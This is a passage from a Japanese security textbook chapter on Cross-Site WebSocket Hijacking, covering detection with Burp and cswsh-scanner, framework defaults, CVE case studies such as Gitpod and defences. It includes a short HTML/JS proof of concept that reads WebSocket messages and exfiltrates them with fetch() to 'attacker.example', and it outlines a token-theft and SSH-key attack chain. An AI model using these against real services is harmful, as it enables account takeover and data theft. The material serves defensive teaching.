2. 対象のハンドシェイクを見つけ、リクエストを Repeater へ送る。
3. 接続を複製し、**Origin ヘッダを正規でないドメインに書き換える**。
4. サーバが `403` を返さず通信を許可するなら、Origin 検証が欠落＝CSWSH の疑いが濃い。
5. あわせて **Cookie の `SameSite` 属性**を DevTools 等で確認する（`None` なら成立条件を満たしやすい）。ハンドシェイク成功時の正常応答は `101 Switching Protocols` である。

#### 自動スキャン：cswsh-scanner

HackMag は、Origin 検証の欠落を大量にテストできる OSS ツール **cswsh-scanner**（Go 製、`github.com/ambalabanov/cswsh-scanner`）を紹介している。

```bash
# インストール（Go 環境）
$ go get -v -u github.com/ambalabanov/cswsh-scanner/...

# 主なオプション
$ cswsh-scanner -h
  -o string   Origin (default "http://hacker.com")   # 偽装する Origin
  -s          Socket.IO support                       # Socket.IO 対応
  -v          Verbose output                          # 詳細出力
  -w int      Number of workers (default 1)           # 並列ワーカ数

# URL リストを流し込み、脆弱（true）だけ数える例
$ cat input.txt | cswsh-scanner -w 100 | grep true | wc -l
```

**動作原理**：ツールは**偽装した Origin ヘッダでハンドシェイクを試み**、サーバが接続を拒否して `403` を返すかどうかを見る。拒否されなければ「Origin 未検証＝潜在的に脆弱（true）」と判定する。手動テストの手順 3〜4 を自動化したものと理解すればよい。HackMag は、1,000 個の WebSocket サービスを検査したところ **約 4.8% が CSWSH に対して潜在的に脆弱**だったと報告している（対象母集団・時期に依存する参考値）。

> ⚠️ **利用上の注意**：この種のスキャナは自分が管理・許可された対象にのみ用いること。無許可の大量スキャンは不正アクセスに該当しうる。

> 出典: Cross-Site WebSocket Hijacking Explained (HackMag) — https://hackmag.com/security/websocket-csrf

---

### 防御：どこで断ち切るか

CSWSH は「三つの実装ミスの重なり」で成立するため、**どれか一つでも塞げば入口を断てる**。RCE チェーンの場合はさらに「WebSocket メッセージ処理側の sink」を塞ぐ二重防御が要る。

#### 1. Origin ヘッダの厳格な検証（最優先）

アクセス制御が Origin モデルに依存する以上、まず**許可リスト（allowlist）方式で Origin を検証**し、不一致は `403` で拒否する。HackMag が引用する Gorilla WebSocket（Go）の `checkSameOrigin` はその実装例だ。

```go
func checkSameOrigin(r *http.Request) bool {
    origin := r.Header["Origin"]
    if len(origin) == 0 {
        return true
    }
    u, err := url.Parse(origin[0])
    if err != nil {
        return false
    }
    return equalASCIIFold(u.Host, r.Host)
}
```

**なぜこれで防げるか**：ハンドシェイクの Origin（ブラウザが設定し JS で改竄不能）と `Host` を突き合わせ、一致しなければ接続を確立させない。悪性サイト（`hacker.com`）からの Origin は対象 Host と一致しないため弾かれる。ただし実装上の落とし穴として、**Origin が空（`len==0`）のとき `true` を返す**点に注意が必要だ。非ブラウザクライアントを通す意図の分岐だが、Origin を送らないクライアントを一律許可する挙動が要件と合うかは要確認である。許可リストは前方一致や部分一致で書くと `hacker-target.com` のようなバイパスを招くため、**完全一致**で照合すること。

#### 2. Cookie に依存しないトークン認証

Pentest-Tools は、認証を**クライアントヘッダで送るワンタイムのトークン**（OAuth / OpenID Connect の JWT 等）に置き換えることを推奨する。**なぜ効くか**：CSWSH が成立するのは「ブラウザが Cookie を自動付与する」からであって、攻撃者の JS がヘッダに任意トークンを載せることは（クロスオリジンで対象の値を読めないため）できない。**Cookie ではなくヘッダで運ぶトークンは CSWSH では持ち出せない**ので、乗っ取っても認証が通らない。

#### 3. ハンドシェイクへの CSRF トークン

OWASP の推奨に沿い、**セッションごとにランダムな一回性トークン（CSRF トークン）をハンドシェイクに要求し、サーバで検証**する。攻撃者はこのトークンの値を知り得ない（クロスオリジンで読めない）ため、正しいハンドシェイクを偽造できない。CSRF 版の対策がそのまま効く、という理解でよい。

#### 4. Cookie の `SameSite` を `Lax`/`Strict` に

前述の通り、セッション Cookie を `SameSite=Lax` または `Strict` にすれば、クロスサイトの WebSocket ハンドシェイクに Cookie が乗らず、たとえ Origin 未検証でも被害者として認証されない。2020年以降のブラウザ既定は `Lax` だが、**明示的に `None` を設定していないか**を必ず点検する。

#### 5. RCE チェーンを断つ：メッセージ処理側の入力検証

CSWSH→RCE の場合、入口を塞ぐだけでなく **WebSocket メッセージハンドラ側の sink** も塞ぐ。受信メッセージを OS コマンド・デシリアライザ・テンプレートエンジンなど危険な処理に直接渡さず、スキーマ検証・型検証・許可リスト化を行う。認証・認可（送ってきた主体が本当にその操作を行える権限を持つか）を**メッセージ単位で**再確認することも重要だ。CSWSH という運び屋を仮に通しても、sink 側が堅牢なら RCE には至らない。

> 出典: Cross-site WebSocket hijacking (Pentest-Tools) — https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh
> 出典: Cross-Site WebSocket Hijacking Explained (HackMag) — https://hackmag.com/security/websocket-csrf
> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/

---

### まとめ

- CSWSH は **CSRF の WebSocket 版**であり、「Origin 未検証」「Cookie 認証」「CSRF トークン不在」の三条件が重なると成立する。CORS のプリフライトが存在しないため、防御線は事実上「サーバの Origin 検証」一点に集約される。
- 成立可否は **`SameSite` 属性とブラウザ実装**に強く依存する。2020年以降の既定 `Lax` により、明示的に `None` を指定したレガシー構成が主な残存リスク。
- 乗っ取りの実体は数行の JS で、`new WebSocket()` がブラウザに Cookie を自動付与させる「アンビエント権限の悪用」が核心。WebSocket の**双方向性**により、履歴窃取にとどまらず任意メッセージ送信が可能になる。
- この双方向性が、WebSocket メッセージ処理側の別の脆弱性（RCE の sink）と結びつくと、**本来到達不能な管理機能へ被害者のセッションを踏み台に到達**でき、リバースシェルや権限昇格へ発展する。CSWSH はあくまで「認証境界を越える運び屋」である。
- 検出は Burp で Origin を書き換えて `403` が返るかを見るのが基本。cswsh-scanner で大量検査も可能だが、許可された対象に限る。1,000 サービス調査で約 4.8% が潜在的に脆弱という参考値がある。
- 防御は多層で。**Origin の完全一致検証**を最優先に、**ヘッダ運搬のトークン認証**、**ハンドシェイクの CSRF トークン**、**`SameSite=Lax/Strict`**、そして RCE チェーン対策として**メッセージ処理側の入力検証と認可の再確認**を重ねる。

## CSWSH実例とフレームワークのデフォルト脆弱性・CVE

### この節で学ぶこと

CSWSH（Cross-Site WebSocket Hijacking、クロスサイトWebSocketハイジャック）は、これまでの節で扱ったハンドシェイクとOrigin検証欠如の理論を、そのまま実害へ変換する攻撃である。本節では次の3点を、防御と検知の観点から掘り下げる。

- **実例（Medium）**: Cookie認証のWebSocketで、被害者になりすまして双方向チャネルを開き、パスワードリセットリンクを盗み出してアカウント乗っ取りに至る手口の骨格。
- **フレームワークのデフォルト脆弱性**: Express（`ws`）、Django Channels、FastAPI/Starlette、Socket.io という主要4フレームワークが「初期設定のままだとCSWSHに対して無防備」である構造的理由と、それを裏付ける実CVE群。
- **実CVE深掘り**: CVE-2023-0957（Gitpod）。SameSite Cookieのサブドメイン抜け穴とCSWSHを連鎖させ、ワークスペース乗っ取りとRCE（Remote Code Execution、遠隔任意コード実行）にまで到達した事例。

いずれも「なぜ初期設定・仕様の組み合わせで成立してしまうのか」という原理に重点を置く。防御実装の判断材料として読んでほしい。実在サービスへの無許可の再現・検証は行わないこと。

---

### 前提の再確認: CSWSHが成立する2条件

個別事例に入る前に、CSWSHが成立する条件を短くおさらいする。仕組みレベルで押さえておくと、以降のCVEが「なぜ起きたか」が一貫して読めるからである。

1. **ハンドシェイクがCookieベース認証に依存している**。WebSocketの確立はHTTPの`GET`リクエスト（`Upgrade: websocket`付き）で始まる。ブラウザはこのクロスオリジンのアップグレードGETに対しても、宛先ドメインのCookieを自動付与する。サーバーが「Cookieが有効＝正規ユーザー」とだけ判断していると、攻撃者ページから開いた接続も認証済みとして扱われてしまう。
2. **サーバーが`Origin`ヘッダーを検証していない**（sink＝信頼判断の最終的な代入先が実質ノーガード）。WebSocketのハンドシェイクにはCORSのプリフライトが働かず、Same-Origin Policyもフレーム送受信を止めない。したがって`Origin`検証を明示的に実装しない限り、どのオリジンからの接続も受理される。

この2つが揃うと、攻撃者は自分のページ上のJavaScriptで`new WebSocket("wss://victim.example/…")`を実行するだけで、被害者の認証Cookie付きの**双方向チャネル**を掌握できる。CSRF（Cross-Site Request Forgery）が「一方向にリクエストを撃ち込む」のに対し、CSWSHは「サーバーからのプッシュを読み、任意フレームを送り返せる」点で威力が段違いになる。この差が、次に見るアカウント乗っ取りを可能にする。

---

### 実例（Medium）: パスワードリセットリンク窃取によるアカウント乗っ取り

> ⚠️ **未取得の資料**: 「Account Takeover Using Cross-Site WebSocket Hijacking (CSWH)」（Sharan Panegav, Medium）は、記事本文の全文自動取得ができませんでした（理由: MediumがWebFetchに対しHTTP 403 Forbiddenを返し、GitHubミラーにも本文が含まれていなかったため）。要点は検索結果から得られた記述に基づいて再構成しています。正確な手順・スクリーンショットは下記URLからご自身で直接ご覧ください: https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50

この記事は、CSWSHの「脆弱性の確認手順」と「アカウント乗っ取りへの武器化」を、実際のバグバウンティの流れに沿って示している。骨格は次の通りである。

#### ステップ1: 対象WebSocketがCSWSHに脆弱かの確認

記事が挙げる確認手順は、破壊的操作を伴わない読み取り中心の検証である。

1. ブラウザで対象Webアプリにログインし、正規の認証済みセッションを確立する。
2. 別タブでWebSocketクライアント（記事では`websocket.org/echo.html`のような外部エコーページ）を開き、対象のWebSocket URL（例: `wss://target.example/socket`）を入力して「Connect」する。
3. 接続が確立し、その別オリジンのページから**サーバーへフレームを送信できてしまう**なら、`Origin`検証が欠如している疑いが濃い。
4. Burp Proxyで正規セッションのWebSocketフレームをキャプチャし、それを再送してサーバーの応答挙動を観察する。

ここで重要なのは、**「別オリジンのページから接続が張れ、かつ認証済みとして応答が返る」こと自体が脆弱性のシグナル**だという点である。前節の成立2条件のうち②（Origin検証欠如）を、外部ページからの接続可否という一次観測で確かめている。

#### ステップ2: 双方向チャネルを使ったアカウント乗っ取り

記事の乗っ取りは、CSWSHを**パスワードリセット機能**と連鎖させるところに核心がある。検索結果から得られた記述によれば、対象アプリではユーザーがログイン中だと、WebSocketの**レスポンスデータの中にパスワードリセットリンクが現れる**という挙動があった。攻撃の連鎖は次のように組み立てられる。

1. 攻撃者は自ドメインに、被害者のブラウザで`new WebSocket()`を実行するJavaScriptを仕込んだページを用意する（PoCの一般形は後掲）。
2. 被害者が（対象にログイン済みの状態で）そのページを開くと、被害者のCookie付きでWebSocketが張られる。
3. 攻撃者ページのJavaScriptは、サーバーからプッシュされる**レスポンスデータ（＝パスワードリセットリンクを含む）を読み取り**、`fetch()`等で攻撃者サーバーへ外部送信（exfiltrate）する。
4. 攻撃者は入手したリセットリンクを使って被害者のパスワードを変更し、アカウントを乗っ取る。

CSRFであればステップ3の「サーバー応答の読み取り」ができないため、この乗っ取りは成立しない。**サーバー応答を読める双方向性こそがCSWSHの威力**であることを、この事例は端的に示している。

（以下は未取得資料の補足として一般知識に基づく解説です）CSWSHのアカウント乗っ取りPoCは、典型的には次のような最小構成のHTML/JavaScriptになる。防御側が「何が読み出され外部送信されるのか」を理解するための例として示す。

```html
<!-- 攻撃者が自ドメインでホストする最小PoC（教育目的の一般形） -->
<script>
  // 被害者のCookieが自動付与された状態で接続が張られる
  const ws = new WebSocket("wss://target.example/socket");

  ws.onopen = () => {
    // 認証済みチャネル上で情報取得系のフレームを送る
    ws.send(JSON.stringify({ type: "getAccountInfo" }));
  };

  // サーバーからのプッシュ（=応答）を読み取り、攻撃者サーバーへ外部送信
  ws.onmessage = (event) => {
    fetch("https://attacker.example/collect", {
      method: "POST",
      body: event.data,          // リセットリンク等の機微データが含まれうる
      mode: "no-cors"
    });
  };
</script>
```

なぜ動くのかを分解すると次の通りである。`new WebSocket()`のアップグレードGETに対し、ブラウザは`target.example`のCookieを自動付与する（成立条件①）。サーバーが`Origin: https://attacker.example`を拒否しないため接続が確立する（成立条件②）。確立後は`onmessage`でサーバーのプッシュを平文で受け取れ、Same-Origin Policyは「別オリジンのWebSocketメッセージのJavaScriptからの読み取り」を妨げない。したがって機微データがそのまま`fetch`で外部に流出する。防御は成立条件のどちらか（理想的には両方）を断つこと——後述の「防御」を参照。

> 出典: Account Takeover Using Cross-Site WebSocket Hijacking (CSWH) — Sharan Panegav, Medium — https://sharan-panegav.medium.com/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50

---

### 主要4フレームワークの「デフォルト脆弱」問題

CSWSHがこれほど広く残存する最大の理由は、**主要WebSocketフレームワークの初期設定が`Origin`検証を行わない**ことにある。DEV.toのまとめ記事は、代表的な4フレームワークについて「デフォルトで脆弱」である構造を整理している。

> 出典: CSWSH: Four Major WebSocket Frameworks Default to Vulnerable While Attackers Get a Bidirectional Channel — DEV.to (roxdavirox) — https://dev.to/roxdavirox/cswsh-four-major-websocket-frameworks-default-to-vulnerable-while-attackers-get-a-bidirectional-hj8

#### なぜ「デフォルトで脆弱」なのか（フレームワーク別）

| フレームワーク | デフォルト挙動 | 脆弱になる理由 |
| --- | --- | --- |
| **Express + `ws`ライブラリ** | `verifyClient`コールバックは**提供されるが必須ではない**。未指定だと**任意のOriginを受理** | 開発者が明示的に`verifyClient`で`Origin`を検査しない限りノーガード |
| **Django Channels** | `OriginValidator` / `AllowedHostsOriginValidator`が用意されているが**デフォルトでは有効化されていない**（オプション扱い） | ドキュメントはリスクを記すが、初期構成では検証が挟まらない |
| **FastAPI / Starlette** | **組み込みのOrigin検証が存在しない**。`CORSMiddleware`は**HTTPルートにのみ適用**され、WebSocketには効かない | 「CORSを設定したから安全」という誤解が生じやすい（CORSはWSハンドシェイクを守らない） |
| **Socket.io（2.4.0より前）** | **全Originをデフォルト受理**。2.4.0でpolling transportのCORSを無効化したが、部分的対応にとどまる | 旧バージョンは無条件受理。バージョン依存の注意が必要 |

ここで最も重要な原理は、**「CORS設定＝WebSocket防御」ではない**という点である。FastAPI/Starletteの`CORSMiddleware`はHTTPのCORSレスポンスヘッダーを制御するものであり、WebSocketのアップグレードには関与しない。WebSocketハンドシェイクにはそもそもCORSプリフライトが発生しないため、CORS設定がどれだけ厳格でも、`Origin`の明示的なサーバー側検証がなければCSWSHは通る。この「守っているつもりで守れていない」ギャップが、デフォルト脆弱性の本質である。

#### 「デフォルト脆弱」を裏付ける実CVE

DEV記事は、これらのデフォルト挙動が現実の重大脆弱性として顕在化した例を挙げている。

- **CVE-2020-25094 / CVE-2020-25095（LogRhythm）**: CSWSHを**コマンドインジェクション**と連鎖させ、**LocalSystem権限での認証不要RCE**に到達。CSWSHが単独でなく、他の欠陥のトリガー・増幅装置として働くことを示す。
- **CVE-2023-0957（Gitpod）**: 「コード実行を含む完全なワークスペース乗っ取り」。CSWSHとSameSiteサブドメイン抜け穴の連鎖（次項で詳述）。
- **CVE-2024-51775（Apache Zeppelin）**: CVSS 7.5。認証済みセッションから**paragraph（ノートブックの段落）内容の窃取**を許した。CSWSHによる情報漏洩の典型例。

#### 検知の指標（防御側の実務）

DEV記事が示す検知の勘所はシンプルかつ実務的である。**「攻撃者ドメインを指す`Origin`ヘッダー」＋「有効なセッションCookieの同時存在」**という組み合わせは、正規トラフィックには通常現れない。正規クライアントの`Origin`は必ず自サービスのオリジンになるからである。したがって、WebSocketアップグレードのログでこの組み合わせを検出できれば、CSWSH試行の高精度なシグナルになる。

#### 3層防御スタック

DEV記事が推奨する多層防御は次の通りで、いずれも成立条件を断つ発想に基づく。

1. **サーバー側Originアローリスト（最優先）**: `Origin`を明示的に検査し、許可リストに一致しない、または`Origin`が欠落しているハンドシェイクを拒否する。成立条件②を直接断つ。
2. **アップグレードURLへのCSRFトークン**: ハンドシェイクのクエリパラメータに短命トークンを載せ、サーバーで検証する。攻撃者は被害者のトークンを事前に知り得ないため接続を張れない。
3. **SameSite Cookie**: `Strict`が望ましい。`Lax`も現行ブラウザでは有効だが、古いクライアントでは確実性が下がる。成立条件①（Cookie自動付与）を弱める。ただし後述のGitpod事例のように、サブドメイン構成では`SameSite`が抜けられる場合があるため、①だけに依存しないこと。

---

### 実CVE深掘り: CVE-2023-0957（Gitpod）

CVE-2023-0957は、クラウド開発環境Gitpodにおける**Cross-Site WebSocket Hijacking**の脆弱性で、CSWSHが単なる情報漏洩を超えて**ワークスペース完全乗っ取りとRCE**に直結した代表例である。

#### 概要と評価

- **対象**: Gitpod（`release-2022.11.2.16`より前のバージョン）。
- **脆弱性種別**: CSWSH。GitpodのJSONRPCサーバーへのWebSocket接続で`Origin`ヘッダーが制限されておらず、被害者の資格情報でWebSocket接続を確立できた。
- **影響**: ワークスペースからのデータ抽出から、**ワークスペースの完全乗っ取り**まで。さらにコード実行（RCE）と、被害者のSCM（Source Control Management、GitHub等のソース管理）アカウントへのアクセスに至った。
- **CVSSスコア**: NVDのCVSS 3.1基本値は**8.2（HIGH）**とされる一方、一部評価では**9.6（Critical）**とされている（評価元により差がある点に注意）。
- **修正版**: `release-2022.11.2.16`。Gitpodは**ベースドメインからのみWebSocket接続を許可する**ように修正した。
- **タイムライン**: 2023年2月13日に開示・ベンダー確認、2月14日に本番環境へパッチ適用、2月22日にCVE採番、3月1日にセルフホスト版パッチ公開。

> 出典: CVE-2023-0957 — NVD (National Vulnerability Database) — https://nvd.nist.gov/vuln/detail/CVE-2023-0957

> ⚠️ **未取得の資料**: NVDの詳細ページ（CVE-2023-0957）は、WebFetchでは動的レンダリングのため本文が取得できませんでした（理由: NVDのSPAが静的HTMLに脆弱性本文を含めず、"NVD - Home"のみが返ったため）。上記の記述はNVDおよびGitpod公式アドバイザリ・Snyk Labsの解析を突き合わせて再構成しています。原典は上記URLからご自身でご確認ください。

#### 仕組み: なぜワークスペース乗っ取りまで届いたか

Gitpodの内部構造と攻撃連鎖を、Snyk Labsの解析に沿ってメカニズムレベルで分解する。

> 出典: Gitpod remote code execution 0-day vulnerability via WebSockets — Snyk Labs — https://labs.snyk.io/resources/gitpod-remote-code-execution-vulnerability-websockets/

**(1) 認証がハンドシェイク時のCookieだけに依存していた**
GitpodはTypeScript製アプリが**WebSocket上でJSONRPC API**を公開し、Reactフロントエンドがそれを消費する構成だった。認証は**WebSocketハンドシェイク時のHTTP Cookieのみ**に依存し、確立後のチャネル内では追加検証がなかった。これは成立条件①そのものである。

**(2) Origin検証がなく、Same-Origin PolicyはWSを止めない**
サーバーは`Origin`ヘッダーを検証していなかった。WebSocketにはSame-Origin Policyが（フレーム送受信に対しては）適用されないため、任意ドメインから`gitpod.io`へのクロスオリジンWebSocket接続を開始できた。成立条件②である。

**(3) SameSite Cookieのサブドメイン抜け穴（核心）**
Gitpodは`SameSite` Cookieを使っていたが、ここに**サブドメインの抜け穴**があった。`SameSite`の「site（サイト）」判定は、**スキーム＋登録可能ドメイン（registrable domain）の組み合わせ**で行われる。Gitpodのワークスペースは`*.gitpod.io`というサブドメイン上で動くため、**攻撃者が用意したGitpodワークスペース（`something.gitpod.io`）から本体`gitpod.io`へ送るリクエストは「same-site」と見なされ、被害者の`SameSite` Cookieが付与されてしまう**。

ここが最重要のポイントである。`SameSite`は「クロスサイト」を防ぐ仕組みだが、判定単位は「オリジン」ではなく「登録可能ドメイン」である。したがって**同一登録可能ドメイン配下の別サブドメイン間は`SameSite`の壁を越えられる**。マルチテナントがユーザー制御可能なサブドメインを配る構成（`*.gitpod.io`のような）では、この抜け穴が`SameSite`防御を無力化する。前項の3層防御で「①だけに依存しないこと」と述べた理由がこれである。

**(4) 攻撃連鎖: ワークスペース乗っ取りとRCE**
以上を組み合わせた攻撃の流れは次の通りである（防御理解のための連鎖の説明であり、再現手順ではない）。

1. 攻撃者がGitpod上に自分のワークスペースをホストする（`*.gitpod.io`上で動く）。
2. そのワークスペースのVS Codeサーバーのエンドポイント（`/version`）を改変し、**悪性JavaScriptを含むHTMLを配信**させる。
3. 被害者にそのリンクを送る。被害者がGitpodにログイン済みの状態で開くと、サブドメイン抜け穴により`SameSite` Cookieが付いた状態で、本体`gitpod.io`のJSONRPCサーバーへWebSocketが張られる。
4. 悪性JavaScriptがJSONRPCメソッドを呼び出し、機微情報を抽出する: `getLoggedInUser`（ログインユーザー情報）、`getGitpodTokens`（Gitpodトークン）、`getOwnerToken`（オーナートークン）。
5. さらに`addSSHPublicKey`で**攻撃者のSSH公開鍵を被害者アカウントに登録**する。これにより攻撃者はSSHでワークスペースへアクセスでき、**任意コード実行（RCE）**とワークスペース完全乗っ取りに至る。

この連鎖の恐ろしさは、CSWSHが「情報を読む」だけでなく、双方向性を活かして`addSSHPublicKey`のような**状態変更mutationを被害者として実行**した点にある。トークン窃取（読み取り）と鍵登録（書き込み）の両方が同一チャネルで行えるため、乗っ取りが完結する。

#### 修正の原理

Gitpodは**「WebSocket接続をベースドメインからのみ許可する」**ように修正した。これは実質的に、サブドメイン（`*.gitpod.io`）からの本体へのWebSocketハンドシェイクを拒否する`Origin`検証であり、成立条件②を断つと同時に、サブドメイン抜け穴の経路自体を塞ぐ。教訓は、**マルチテナントでユーザー制御可能なサブドメインを配る設計では、`SameSite`に頼らず、WebSocketの`Origin`を厳格にベースドメインへ限定せよ**ということである。

---

### 本節のまとめ

- CSWSHは「Cookie依存認証」＋「Origin検証欠如」の2条件で成立し、**サーバー応答を読める双方向性**によってCSRFを超える実害（パスワードリセットリンク窃取によるアカウント乗っ取り等）を生む。
- Express（`ws`）、Django Channels、FastAPI/Starlette、Socket.io（旧版）は**初期設定で`Origin`を検証しない**。特にFastAPI/Starletteでは`CORSMiddleware`がWebSocketを守らない点が誤解の温床になる。**CORS設定はWebSocket防御ではない**。
- CVE-2023-0957（Gitpod, 2023年, CVSS 8.2〜9.6, 修正版`release-2022.11.2.16`）は、**`SameSite`のサブドメイン抜け穴**とCSWSHを連鎖させ、トークン窃取＋`addSSHPublicKey`によるワークスペース乗っ取り・RCEに到達した。`SameSite`は「登録可能ドメイン」単位の防御であり、ユーザー制御サブドメイン構成では単独で頼れない。
- 防御は**サーバー側Originアローリスト（最優先）＋アップグレードURLのCSRFトークン＋SameSite Cookie**の多層で、成立条件を複数同時に断つこと。検知は「攻撃者ドメインのOrigin＋有効セッションCookie」の同時出現を監視する。

## 実習: PortSwigger CSWSH ラボ

### この節の位置づけ

本章ではここまで、Cross-Site WebSocket Hijacking (CSWSH) の理論——WebSocketハンドシェイクがCookieベースの自動認証を引き継ぐこと、`Origin`ヘッダーの検証がなければ第三者オリジンからのハンドシェイクを区別できないこと、そしてSame-Origin Policyが「WebSocket接続の確立」自体をブロックしない（＝XHRやfetchと異なりCORS的な事前チェックが働かない）ことを説明してきた。本節では、その理論を体系立てて確認できる実習環境として、PortSwigger Web Security Academyが提供する公式ラボ「Cross-site WebSocket hijacking」を取り上げる。

本書はスコープ制約上、ラボの**攻略手順（解答）は記載しない**。ここで扱うのは、ラボが提示している脆弱なアプリケーションの構造と、その構造がなぜCSWSHを成立させるのかという仕組みの解説である。実際の攻略はPortSwigger Web Security Academyの公式サイト上で、自分のラボインスタンスに対してのみ行うこと。

### ラボの概要

対象ラボは「Cross-site WebSocket hijacking」というLabラベル（難易度: Practitioner相当）で公開されている、ライブチャット機能を持つWebアプリケーションである。ラボの目的として明記されているのは、cross-site WebSocket hijacking攻撃を用いて被害者のチャット履歴を窃取し、最終的にそのアカウントへアクセスすることである。

> 出典: Cross-site WebSocket hijacking — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

ラボにはPortSwigger提供の「exploit server」（攻撃者が用意するペイロード配信用の別オリジンサーバーを模した機能）が付属しており、そこに悪意あるHTML/JavaScriptを設置して被害者ボットに読み込ませる、という一連の流れを実際の通信で体験できる構成になっている。この構成自体が、CSWSHが「サーバー間の脆弱性」ではなく「クロスオリジンでのブラウザ挙動を悪用する脆弱性」であることを体現している——攻撃者が直接被害者のセッションを盗むのではなく、被害者のブラウザに、被害者自身の認証情報（セッションCookie）を使わせて攻撃者の代わりに正規のWebSocket接続を張らせる、という間接攻撃の形を取る。

### 脆弱なチャット機能の構造

ラボのライブチャットは、典型的な「WebSocketベースのチャットウィジェット」として実装されている。ブラウザ上のJavaScriptがページ読み込み時（またはチャットを開いたタイミング）に`wss://`スキームでWebSocketハンドシェイクを送信し、サーバーが101 Switching Protocolsで応答すると、以後はWebSocketフレームでメッセージがやり取りされる。

このときの認証は、通常のHTTPリクエストと同様に**ブラウザが自動送信するセッションCookie**に依存している。WebSocketのハンドシェイクリクエストは形式上は1本のHTTP GETリクエストであるため、対象ドメインに対して有効なセッションCookieを持つブラウザであれば、そのCookieは（`SameSite`属性が適切に設定されていない限り）オリジンを問わず自動的に付与される。ここが脆弱性の起点であり、本章前節で説明した「WebSocketハンドシェイクはHTTPの皮を被った特殊なGETリクエストである」という性質がそのまま攻撃面になっている。

チャット確立後、クライアントは`READY`という制御メッセージ（またはそれに類するコマンド）をWebSocket上で送信し、それを受けてサーバーは当該ユーザーの過去のチャット履歴をJSON形式でまとめて返す、という設計になっている。この「接続確立→READY送信→履歴一括取得」という流れそのものは正規の機能だが、**「誰が」その接続を確立したかをサーバー側が検証していない**ことが問題になる。攻撃者オリジンのページ内で発行されたJavaScriptから同じ手順（接続→READY送信）を再現すれば、被害者のブラウザ経由で被害者のセッションを使い、被害者のチャット履歴を攻撃者が取得できてしまう。

### 脆弱性の技術的な核心: 二重の検証欠如

ラボの脆弱性は、構造的には次の二点の欠如に集約される。

#### 1. `Origin`ヘッダーのサーバー側検証がない

WebSocketハンドシェイクリクエストには、ブラウザが自動的に付与する`Origin`ヘッダーが含まれる。これは通常のCORSにおける`Origin`ヘッダーと同じ仕組みで、「このリクエストがどのオリジン（スキーム＋ホスト＋ポート）のページから発行されたか」をサーバーに伝える情報である。

```http
GET /chat HTTP/1.1
Host: vulnerable-website.com
Origin: https://attacker-exploit-server.example
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Sec-WebSocket-Version: 13
Cookie: session=<被害者の正規セッションCookie>
```

本来サーバーは、このヘッダーの値が自ドメインまたは許可リストに含まれるオリジンであるかを検証し、一致しなければハンドシェイクを101で完了させず拒否するべきである。しかしラボのアプリケーションはこの検証を行っていないため、`attacker-exploit-server.example`のような全く無関係なオリジンから送られたハンドシェイクでも、正規のハンドシェイクとして受け入れてしまう。

ここで重要なのは、**`Origin`ヘッダーはブラウザが自動的にセットし、JavaScript側から偽装できない**という点である。したがって攻撃者にできることは、「攻撃者のオリジンから正規にWebSocket接続を開くJavaScriptを被害者のブラウザで実行させる」ことだけであり、それだけでハンドシェイクには真実の（＝攻撃者オリジンの）`Origin`ヘッダーが付与される。つまりこの脆弱性を成立させているのは、ヘッダーの偽装ではなく、**サーバー側がそのヘッダーの値を見て判断する処理そのものを実装していない**という点にある。

#### 2. WebSocketハンドシェイクにCSRFトークンが存在しない

ラボの説明では、WebSocketハンドシェイクリクエストにCSRFトークンが含まれていないことが明示的に問題として挙げられている。

> 出典: Cross-site WebSocket hijacking — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

通常のフォーム送信やAjaxリクエストに対するCSRF対策では、サーバーが発行した推測不可能なトークンをリクエストに含めさせ、Cookieだけでは正規リクエストと認めない、という設計にする。これはCSRFの本質的な対策原理——「Cookieは自動送信されてしまうため信頼できないが、トークンは攻撃者ページからは読み取れない（Same-Origin Policyによりレスポンスボディの中身は別オリジンJSから読めない）ため、トークンの一致を認証の補助的な証拠として使う」——に基づく。

WebSocketのハンドシェイクはブラウザのJavaScript API（`new WebSocket(url)`）から発行されるが、この API は通常のXHR/fetchのようにカスタムヘッダーを自由に付与する手段を持たない。そのため、CSRFトークンをハンドシェイクリクエストのヘッダーやクエリパラメータに含めるという対策を実装するには、サーバー側・クライアント側双方で明示的な設計が必要になる。ラボのアプリケーションはこれを実装していないため、Cookieのみに依存した認証となり、Origin検証の欠如と合わさることで攻撃が成立する。

### なぜSame-Origin Policyがこれを防がないのか

「Same-Origin Policyがあるのだから、別オリジンのJavaScriptが被害者のサイトに接続できないのでは」という疑問を持つ読者もいるだろう。ここが本節の核心となる仕組みの説明である。

Same-Origin Policyが制限しているのは、主に「別オリジンのレスポンスの内容をJavaScriptから読み取ること」である。しかし、**リクエストを送信すること自体（フォーム送信、`<img>`タグの読み込み、そしてWebSocketの接続確立）はブロックされない**。これはCSRF攻撃が古くから成立してきたのと全く同じ原理であり、WebSocketも例外ではない。

具体的には次のような非対称性がある。

- 通常のXHR/fetchによるクロスオリジンリクエストは、CORSのpreflight（`OPTIONS`メソッドによる事前確認）やレスポンスの`Access-Control-Allow-Origin`ヘッダーによって、**レスポンスをJavaScriptが読み取れるかどうか**が制御される。
- 一方、WebSocketの接続確立（ハンドシェイク）にはCORSのpreflightという概念が存在しない。JavaScriptが`new WebSocket("wss://victim.com/chat")`を呼び出せば、ブラウザは即座にハンドシェイクリクエストを送信し、サーバーが101で応答すればその時点で双方向のメッセージ通信路が確立される。**この接続確立の可否を制御する唯一の手段が、サーバー側での`Origin`ヘッダー検証である**。

つまりCSWSHは、「ブラウザの安全機構が壊れている」のではなく、「WebSocketの仕様上、オリジン制御はサーバー側の実装責任に委ねられているにもかかわらず、その実装が欠落している」ことによって成立する脆弱性である。ラボはまさにこの構造——認証はCookie任せ、オリジン検証は未実装、CSRFトークンも存在しない——を意図的に再現し、受講者に体験させる設計になっている。

### ラボが示す攻撃の全体像（構造のみ、手順は割愛）

ラボの想定シナリオを構造として整理すると、次のようになる（繰り返しになるが、具体的な攻略コードやステップバイステップの手順はここには記載しない）。

